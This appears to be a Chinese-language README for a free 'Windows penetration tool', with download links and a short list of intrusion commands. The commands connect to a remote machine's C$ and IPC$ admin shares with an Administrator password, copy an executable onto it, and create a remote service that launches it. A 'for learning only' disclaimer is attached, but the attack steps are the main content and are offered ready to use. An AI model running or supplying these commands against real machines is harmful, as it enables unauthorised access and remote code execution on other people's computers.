# Windows系统渗透工具

#### 前言
本文件的其他语言在[这里](https://docs.qq.com/s/NHLnUCu6mkoMtfbAq_AaXW)，可自提

#### 介绍
本产品可以让用户测试自己的电脑会不会被入侵，仅供学习！
警告：未进允许的渗透是违法的，与作者无关！


#### 程序说明
本程序只是将最常见的渗透方法做了总结，并不能拿来当作专业软件来使用。本产品是完全免费的（但不包括以后收费），更没有什么破解版。

#### 安装和运行
本产品是免安装运行的，可[点我](https://gitee.com/worm_ruchong/Windows-infiltration-tool/releases)下载，或者在[蓝奏•云储存|密码：msdn](https://wormdownload.lanzoum.com/b03jr8tif)中自主下载

#### 最常见的几种渗透
1.连接共享目录

```
net use \\192.168.181.1\c$\ 123456 /user:Administrator
```
2.复制文件

```
copy 1.exe \\192.168.181.1\C$\1.exe
```
3.创建启动项(服务类)

```
net use \\192.168.181.1\ipc$ 123456 /user:Administrator
sc \\192.168.181.1 create start binpath="c:\1.exe" displayname="start"
```

worm蠕虫版权所有©，有侵必究！
